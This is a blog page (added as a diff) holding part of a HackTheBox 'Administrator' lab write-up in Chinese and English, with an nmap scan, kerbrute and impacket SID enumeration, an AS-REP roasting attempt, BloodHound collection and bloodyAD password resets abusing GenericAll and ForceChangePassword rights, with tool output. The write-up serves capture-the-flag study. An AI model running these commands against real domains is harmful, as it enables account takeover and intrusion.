@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Nmap Result Not shown: 65509 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 127 Microsoft ftpd 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-16 20:34:54Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 57388/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 57399/tcp open unknown syn-ack ttl 127 57404/tcp open unknown syn-ack ttl 127 57415/tcp open unknown syn-ack ttl 127 57447/tcp open unknown syn-ack ttl 127 64600/tcp open unknown syn-ack ttl 127 Enumeration Machine information 给出一个valid credential：\n">
+<title>HTB-Administrator-Writeup</title>
+
+<link rel='canonical' href='http://localhost:1313/htb-administrator-Writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="HTB-Administrator-Writeup">
+<meta property='og:description' content="Nmap Result Not shown: 65509 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 127 Microsoft ftpd 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-16 20:34:54Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 57388/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 57399/tcp open unknown syn-ack ttl 127 57404/tcp open unknown syn-ack ttl 127 57415/tcp open unknown syn-ack ttl 127 57447/tcp open unknown syn-ack ttl 127 64600/tcp open unknown syn-ack ttl 127 Enumeration Machine information 给出一个valid credential：\n">
+<meta property='og:url' content='http://localhost:1313/htb-administrator-Writeup/'>
+<meta property='og:site_name' content='JoWhite'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-04-20T02:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-20T02:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/legacy/uploads/2025/04/1745035819-download-150x150.png' />
+<meta name="twitter:title" content="HTB-Administrator-Writeup">
+<meta name="twitter:description" content="Nmap Result Not shown: 65509 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 127 Microsoft ftpd 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-16 20:34:54Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 57388/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 57399/tcp open unknown syn-ack ttl 127 57404/tcp open unknown syn-ack ttl 127 57415/tcp open unknown syn-ack ttl 127 57447/tcp open unknown syn-ack ttl 127 64600/tcp open unknown syn-ack ttl 127 Enumeration Machine information 给出一个valid credential：\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/legacy/uploads/2025/04/1745035819-download-150x150.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/en/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_8394d4d868d05114.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😀</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/en">JoWhite</a></h1>
+            <h2 class="site-description">OraOra!</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/en/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/" >中文</option>
+                                
+                                    <option value="http://localhost:1313/en/" selected>English</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#nmap-result">Nmap Result</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#acl-abuse-wp-block-heading">ACL Abuse {.wp-block-heading}<figure class="wp-block-image size-large"></a></li>
+    <li><a href="#user-and-root-flags">User and Root flags</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/htb-administrator-Writeup/">
+                
+                    <img src="/legacy/uploads/2025/04/1745035819-download-150x150.png" loading="lazy" alt="Featured image of post HTB-Administrator-Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/en/categories/htb/" >
+                HackTheBox Writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb-administrator-Writeup/">HTB-Administrator-Writeup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 20, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="http://localhost:1313/htb-administrator-Writeup/" class="link">中文</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="nmap-result">Nmap Result
+</h2><div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+Not shown: 65509 closed tcp ports (reset)
+PORT      STATE SERVICE       REASON          VERSION
+21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-16 20:34:54Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  unknown       syn-ack ttl 127
+49665/tcp open  unknown       syn-ack ttl 127
+49666/tcp open  unknown       syn-ack ttl 127
+49667/tcp open  unknown       syn-ack ttl 127
+49668/tcp open  unknown       syn-ack ttl 127
+57388/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+57399/tcp open  unknown       syn-ack ttl 127
+57404/tcp open  unknown       syn-ack ttl 127
+57415/tcp open  unknown       syn-ack ttl 127
+57447/tcp open  unknown       syn-ack ttl 127
+64600/tcp open  unknown       syn-ack ttl 127
+</pre>
+</div>
+<h2 id="enumeration">Enumeration
+</h2><p>Machine information 给出一个valid credential：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+Username: Olivia Password: ichliebedich
+</pre>
+</div>
+<p>首先尝试连接21/FTP端口，olivia和匿名登录均失败:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="600" height="412" src="../legacy/uploads/2025/04/1745031094-image.png" alt="" class="wp-image-1226" srcset="../legacy/uploads/2025/04/1745031094-image.png 600w, ../legacy/uploads/2025/04/1745031094-image-300x206.png 300w" sizes="auto, (max-width: 600px) 100vw, 600px" /> </figure></p>
+<p>尝试用enum4linux和smbclient连接，但仍然失败. 但得知域名为Adiministrator：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="696" src="../legacy/uploads/2025/04/1745031215-image-1024x696.png" alt="" class="wp-image-1228" srcset="../legacy/uploads/2025/04/1745031215-image-1024x696.png 1024w, ../legacy/uploads/2025/04/1745031215-image-300x204.png 300w, ../legacy/uploads/2025/04/1745031215-image-768x522.png 768w, ../legacy/uploads/2025/04/1745031215-image.png 1281w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>使用kerbrute确认olivia是否为域内valid用户:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+./kerbrute userenum -d administrator --dc 10.10.11.42 users 
+<pre><code>__             __               __     
+</code></pre>
+<p>/ /_____  <em><em><strong><em>/ /</em>  _______  <strong>/ /</strong></strong>
+/ //_/ _ / <em><em><em>/ __ / <em><em><em>/ / / / __/ _ <br>
+/ ,&lt; /  __/ /  / /</em>/ / /  / /</em>/ / /</em>/  __/
+/</em>/|</em>|_</em></em>/<em>/  /</em>.</em><em><em>/</em>/   _</em>,<em>/_</em>/___/</p>
+<p>Version: v1.0.3 (9dad6e1) - 04/19/25 - Ronnie Flathers @ropnop</p>
+<p>2025/04/19 12:56:16 &gt;  Using KDC(s):
+2025/04/19 12:56:16 &gt;   10.10.11.42:88</p>
+<p>2025/04/19 12:56:16 &gt;  [+] VALID USERNAME:       olivia@administrator
+2025/04/19 12:56:16 &gt;  Done! Tested 1 usernames (1 valid) in 0.007 seconds
+</pre></p>
+</div>
+<p>得知olivia是域用户后，可以使用impacket-lookupsid来暴力枚举用户列表：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+impacket-lookupsid &#039;Olivia&#039;@10.10.11.42                                                           
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+<p>Password:
+[<em>] Brute forcing SIDs at 10.10.11.42
+[</em>] StringBinding ncacn_np:10.10.11.42[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-1088858960-373806567-254189436
+498: ADMINISTRATOR\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: ADMINISTRATOR\Administrator (SidTypeUser)
+501: ADMINISTRATOR\Guest (SidTypeUser)
+502: ADMINISTRATOR\krbtgt (SidTypeUser)
+512: ADMINISTRATOR\Domain Admins (SidTypeGroup)
+513: ADMINISTRATOR\Domain Users (SidTypeGroup)
+514: ADMINISTRATOR\Domain Guests (SidTypeGroup)
+515: ADMINISTRATOR\Domain Computers (SidTypeGroup)
+516: ADMINISTRATOR\Domain Controllers (SidTypeGroup)
+517: ADMINISTRATOR\Cert Publishers (SidTypeAlias)
+518: ADMINISTRATOR\Schema Admins (SidTypeGroup)
+519: ADMINISTRATOR\Enterprise Admins (SidTypeGroup)
+520: ADMINISTRATOR\Group Policy Creator Owners (SidTypeGroup)
+521: ADMINISTRATOR\Read-only Domain Controllers (SidTypeGroup)
+522: ADMINISTRATOR\Cloneable Domain Controllers (SidTypeGroup)
+525: ADMINISTRATOR\Protected Users (SidTypeGroup)
+526: ADMINISTRATOR\Key Admins (SidTypeGroup)
+527: ADMINISTRATOR\Enterprise Key Admins (SidTypeGroup)
+553: ADMINISTRATOR\RAS and IAS Servers (SidTypeAlias)
+571: ADMINISTRATOR\Allowed RODC Password Replication Group (SidTypeAlias)
+572: ADMINISTRATOR\Denied RODC Password Replication Group (SidTypeAlias)
+1000: ADMINISTRATOR\DC$ (SidTypeUser)
+1101: ADMINISTRATOR\DnsAdmins (SidTypeAlias)
+1102: ADMINISTRATOR\DnsUpdateProxy (SidTypeGroup)
+1108: ADMINISTRATOR\olivia (SidTypeUser)
+1109: ADMINISTRATOR\michael (SidTypeUser)
+1110: ADMINISTRATOR\benjamin (SidTypeUser)
+1111: ADMINISTRATOR\Share Moderators (SidTypeAlias)
+1112: ADMINISTRATOR\emily (SidTypeUser)
+1113: ADMINISTRATOR\ethan (SidTypeUser)
+3601: ADMINISTRATOR\alexander (SidTypeUser)
+3602: ADMINISTRATOR\emma (SidTypeUser)
+</pre></p>
+</div>
+<p>至此，得到了一个用户列表：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+olivia
+michael
+benjamin
+emily
+ethan
+alexander
+emma
+</pre>
+</div>
+<p>如果在域环境内，用户没有开启kerberos pre-authentication，那么攻击者无需用户密码就可以获得用户的authentication-response，并尝试离线破解。impacket-GetNPUsers可以枚举有哪些用户没有开启此选项，并尝试获取AS-REP. 此攻击也被称为AS-REP Roasting. 尝试:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+impacket-GetNPUsers -usersfile users -no-pass -dc-host administrator -dc-ip 10.10.11.42 administrator/
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+<p>[-] User olivia doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User benjamin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User emily doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ethan doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</pre></p>
+</div>
+<p>没有用户设置了DONT_REQUIRE_PREAUTH. 但我们还有Olivia的密码，尝试用bloodhound-python远程获取域内结构：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+bloodhound-python -u Olivia -p &#039;ichliebedich&#039; -d administrator.htb -ns 10.10.11.42 -c All --zip          
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: administrator.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: &#x5B;Errno Connection error (dc.administrator.htb:88)] &#x5B;Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc.administrator.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.administrator.htb
+INFO: Found 11 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.administrator.htb
+INFO: Done in 00M 02S
+INFO: Compressing output into 20250419131421_bloodhound.zip
+</pre>
+</div>
+<p>打开bloodhound并上传.</p>
+<h2 id="acl-abuse-wp-block-heading">ACL Abuse {.wp-block-heading}<figure class="wp-block-image size-large">
+</h2><p><img loading="lazy" decoding="async" width="1024" height="141" src="../legacy/uploads/2025/04/1745032972-image-1024x141.png" alt="" class="wp-image-1245" srcset="../legacy/uploads/2025/04/1745032972-image-1024x141.png 1024w, ../legacy/uploads/2025/04/1745032972-image-300x41.png 300w, ../legacy/uploads/2025/04/1745032972-image-768x105.png 768w, ../legacy/uploads/2025/04/1745032972-image-1536x211.png 1536w, ../legacy/uploads/2025/04/1745032972-image.png 1704w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>Olivia对用户Michael有GenericAll权限，Michael对Benjamin有ForceChangePassword权限，而Benjiamin属于组Share Moderators。</p>
+<p>当一个用户A对另一个用户B有GenericAll权限时，则A可以对B：</p>
+<ul class="wp-block-list">
+  <li>
+    <strong>修改密码</strong>
+  </li>
+  <li>
+    <strong>更改用户属性</strong>
+  </li>
+  <li>
+    <strong>添加用户到组</strong>
+  </li>
+  <li>
+    <strong>修改用户SPN</strong> - Targeted kerberoasting
+  </li>
+</ul>
+<p>当一个用户A对另一个用户B有ForceChangePassword权限时，则A可以<strong>强制修改</strong>B的密码。</p>
+<p>尝试使用bloodyAD修改michael密码：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+bloodyAD --host 10.10.11.42 -d administrator -u Olivia -p ichliebedich set password Michael &#039;Password123!&#039;
+&#x5B;+] Password changed successfully!
+</pre>
+</div>
+<p>再以Michael的身份修改Benjamin的密码：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+bloodyAD --host 10.10.11.42 -d administrator -u Michael -p Password123! set password Benjamin &#039;Password123!&#039;
+&#x5B;+] Password changed successfully!
+</pre>
+</div>
+<p>根据Benjamin隶属的组名Share Moderators，猜测Benjamin应该有权限管理SMB share或者FTP，尝试登录这两个服务：<figure class="wp-block-image size-full"></p>
